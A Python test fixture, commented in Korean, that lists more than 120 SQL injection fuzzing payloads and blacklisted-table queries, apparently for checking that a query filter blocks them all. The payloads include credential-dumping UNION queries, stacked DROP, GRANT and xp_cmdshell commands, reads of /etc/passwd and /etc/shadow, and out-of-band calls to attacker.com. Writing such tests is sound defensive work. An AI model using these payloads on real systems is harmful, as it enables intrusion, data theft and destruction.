"""
SQL Injection 퍼징 테스트 패턴

OWASP Top 10 SQL Injection 패턴 100개 이상을 정의합니다.

Stories: 3-2
FRs: NFR-S1 (100% 차단율)
"""

# OWASP 기반 SQL Injection 퍼징 테스트 패턴 (100+ 패턴)
INJECTION_FUZZING_PATTERNS = [
    # ===== UNION 기반 공격 (15개) =====
    "SELECT * FROM users UNION SELECT * FROM admin",
    "1 UNION ALL SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,username,password FROM users--",
    "UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT NULL,NULL,version()--",
    "UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT @@version,NULL,NULL--",
    "1' UNION SELECT NULL,load_file('/etc/passwd'),NULL--",
    "UNION ALL SELECT CONCAT(username,':',password) FROM admin--",
    "' UNION SELECT database(),user(),version()--",
    "UNION SELECT NULL WHERE 1=2 UNION SELECT * FROM users--",
    "' UNION SELECT SCHEMA_NAME FROM information_schema.SCHEMATA--",
    "UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT extractvalue(1, concat(0x7e, version()))--",
    "UNION SELECT LOAD_FILE('/etc/passwd')--",
    # ===== Tautology 기반 공격 (15개) =====
    "1' OR '1'='1",
    "admin'--",
    "1 OR 1=1",
    "' OR 'x'='x",
    "1' OR 1=1--",
    "admin' OR '1'='1'--",
    "' OR 1=1#",
    "1' OR '1'='1' /*",
    "' OR 'a'='a",
    "admin' OR 1=1 LIMIT 1--",
    "1' OR 2>1--",
    "' OR 'foo'='foo'--",
    "1' OR 1=1 AND '1'='1",
    "admin'='admin'--",
    "' OR 1=1 UNION ALL SELECT NULL--",
    # ===== 주석 기반 우회 (15개) =====
    "SELECT * FROM users--",
    "SELECT * FROM users/**/WHERE 1=1",
    "1; --comment",
    "admin'--",
    "' OR 1=1--",
    "SELECT * FROM users#comment",
    "1' AND '1'='1'--",
    "/**/SELECT/**/password/**/FROM/**/admin",
    "SELECT * -- comment\nFROM users",
    "admin'/**/OR/**/1=1--",
    "' OR '1'='1' --",
    "SELECT * FROM users WHERE id=1-- AND active=1",
    "admin' #",
    "1' /*comment*/ OR /*comment*/ '1'='1",
    "-- DROP TABLE users",
    # ===== Time-based Blind Injection (15개) =====
    "1; SLEEP(10)--",
    "1' AND SLEEP(10)--",
    "' OR SLEEP(10)--",
    "IF(1=1, SLEEP(10), 0)--",
    "1' AND IF(1=1, SLEEP(5), 0)--",
    "' OR IF(EXISTS(SELECT * FROM users), SLEEP(10), 0)--",
    "BENCHMARK(10000000,MD5('test'))--",
    "1' AND BENCHMARK(10000000,SHA1('test'))--",
    "' OR BENCHMARK(5000000,ENCODE('test','key'))--",
    "WAITFOR DELAY '00:00:10'--",
    "1'; WAITFOR DELAY '00:00:05'--",
    "' AND WAITFOR DELAY '00:00:10'--",
    "PG_SLEEP(10)--",
    "1' AND PG_SLEEP(5)--",
    "SELECT CASE WHEN (1=1) THEN PG_SLEEP(10) ELSE PG_SLEEP(0) END--",
    # ===== Stacked Queries (15개) =====
    "1; DROP TABLE users--",
    "'; DROP TABLE admin--",
    "1'; INSERT INTO admin VALUES('hacker','password')--",
    "; DELETE FROM users WHERE id>0--",
    "1; UPDATE users SET password='hacked'--",
    "'; CREATE TABLE evil(id int)--",
    "1; EXEC sp_executesql @statement--",
    "; TRUNCATE TABLE sessions--",
    "1'; ALTER TABLE users ADD COLUMN hacked VARCHAR(255)--",
    "; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--",
    "1; REVOKE ALL PRIVILEGES ON users FROM admin--",
    "'; CALL system('ls -la')--",
    "; xp_cmdshell('whoami')--",
    "1; EXECUTE AS USER='admin'--",
    "'; SHUTDOWN--",
    # ===== Error-based Injection (10개) =====
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--",
    "1' AND UPDATEXML(NULL,CONCAT(0x0a,version()),NULL)--",
    "' OR EXP(~(SELECT * FROM (SELECT version())a))--",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND GTID_SUBSET(version(),1)--",
    "1' AND JSON_KEYS((SELECT CONVERT((SELECT @@version) USING utf8)))--",
    "' OR POLYGON((SELECT * FROM (SELECT @@version)a))--",
    "1' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT database())a))--",
    "' OR MULTIPOINT((SELECT * FROM (SELECT user())a))--",
    "1' AND LINESTRING((SELECT * FROM (SELECT table_name FROM information_schema.tables LIMIT 1)a))--",
    # ===== Out-of-Band Injection (10개) =====
    "' AND LOAD_FILE('/etc/passwd')--",
    "1' UNION SELECT LOAD_FILE('/etc/shadow')--",
    "' INTO OUTFILE '/tmp/output.txt'--",
    "SELECT * INTO DUMPFILE '/tmp/dump.txt' FROM users--",
    "1' AND (SELECT @@version INTO OUTFILE '/tmp/version.txt')--",
    "' UNION SELECT password INTO OUTFILE '/tmp/passwords.txt' FROM admin--",
    "LOAD DATA INFILE '/etc/passwd' INTO TABLE temp--",
    "1' AND UTL_HTTP.REQUEST('http://attacker.com/'||version())--",
    "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--",
    "1' AND DBMS_LDAP.INIT('attacker.com',389)--",
    # ===== Boolean-based Blind Injection (10개) =====
    "1' AND SUBSTRING(version(),1,1)='5'--",
    "' AND ASCII(SUBSTRING(database(),1,1))>100--",
    "1' AND LENGTH(database())>5--",
    "' AND (SELECT COUNT(*) FROM users)>10--",
    "1' AND MID(@@version,1,1)='5'--",
    "' AND ORD(MID(version(),1,1))>52--",
    "1' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
    "' AND (SELECT table_name FROM information_schema.tables LIMIT 1)='users'--",
    "1' AND IF(ASCII(SUBSTRING((SELECT password FROM admin LIMIT 1),1,1))>100,TRUE,FALSE)--",
    "' AND CHAR_LENGTH((SELECT database()))=8--",
    # ===== 시스템 정보 수집 (10개) =====
    "SELECT @@VERSION",
    "SELECT DATABASE()",
    "SELECT CURRENT_USER",
    "SELECT SESSION_USER",
    "SELECT SYSTEM_USER",
    "' UNION SELECT @@datadir--",
    "1' AND (SELECT @@hostname)--",
    "' UNION SELECT @@basedir--",
    "SELECT * FROM mysql.user",
    "' UNION SELECT table_schema FROM information_schema.tables--",
    # ===== 인코딩 우회 (5개) =====
    "0x61646d696e",  # hex: 'admin'
    "SELECT CHAR(97,100,109,105,110)",  # 'admin'
    "' UNION SELECT 0x5461626c65--",
    "1' AND CONVERT(0x61646d696e USING utf8)--",
    "' OR UNHEX('61646d696e')='admin'--",
]

# 블랙리스트 테이블 접근 시도 패턴
BLACKLIST_TABLE_PATTERNS = [
    "SELECT * FROM t_admin",
    "SELECT * FROM t_user_password",
    "SELECT * FROM t_payment_card",
    "SELECT * FROM t_user_identity",
    "SELECT * FROM t_api_keys",
    "SELECT * FROM t_sessions",
    "SELECT * FROM mysql.user",
    "SELECT * FROM information_schema.tables",
    "SELECT * FROM performance_schema.events",
    "SELECT * FROM sys.schema_table_statistics",
    "SELECT * FROM t_member JOIN t_admin ON t_member.id = t_admin.user_id",
    "SELECT * FROM t_payment JOIN t_payment_card ON t_payment.id = t_payment_card.payment_id",
]

# 전체 테스트 패턴 수 검증
assert (
    len(INJECTION_FUZZING_PATTERNS) >= 120
), f"Expected 120+ injection patterns, got {len(INJECTION_FUZZING_PATTERNS)}"
